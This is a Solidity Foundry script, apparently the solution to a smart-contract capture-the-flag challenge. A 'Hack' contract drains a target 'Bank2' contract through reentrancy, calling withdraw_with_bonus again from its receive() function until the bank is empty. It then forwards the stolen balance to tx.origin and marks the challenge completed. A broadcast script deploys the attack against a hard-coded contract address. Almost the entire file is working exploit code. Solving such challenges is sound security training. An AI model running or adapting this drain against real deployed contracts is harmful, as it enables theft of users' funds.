// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Task.sol";
import {Script, console} from "forge-std/Script.sol";

contract Hack {
    uint public initBalance = address(this).balance;
    Bank2 _bank2Instance;

    constructor(Bank2 bank2Instance) payable {
        _bank2Instance = bank2Instance;
    }

    function hackContract() external {
        console.log("Deposit + bonus:", initBalance);
        address(_bank2Instance).call{value: initBalance / 2}("");
        _bank2Instance.giveBonusToUser{value: initBalance / 2}(address(this));
        _bank2Instance.withdraw_with_bonus();
    }

    receive() external payable {
        uint toMove = initBalance;
        uint current_balance = msg.sender.balance;
        console.log("Reentrance msg.sender.balance: ", msg.sender.balance);
        if (current_balance > 0) {
            console.log("Reentrance with %s withdraw", toMove);
            _bank2Instance.withdraw_with_bonus();
        } else {
            console.log("Move everything to ", tx.origin);
            payable(tx.origin).transfer(address(this).balance);
            _bank2Instance.setCompleted(true);
        }
    }
}

contract Solution is Script {
    Bank2 public bank2Instance =
        Bank2(payable(0xFc1894AB62F089eC0627bf47EB82Cc86792Ff304));

    function run() external {
        vm.startBroadcast();
        console.log("Contract Balance: ", address(bank2Instance).balance);
        console.log("Completed: ", bank2Instance.completed());
        Hack hackContractInstance = new Hack{
            value: address(bank2Instance).balance * 2
        }(bank2Instance);
        hackContractInstance.hackContract();

        console.log("Contract Balance: ", address(bank2Instance).balance);
        console.log("Completed: ", bank2Instance.completed());
        vm.stopBroadcast();
    }
}
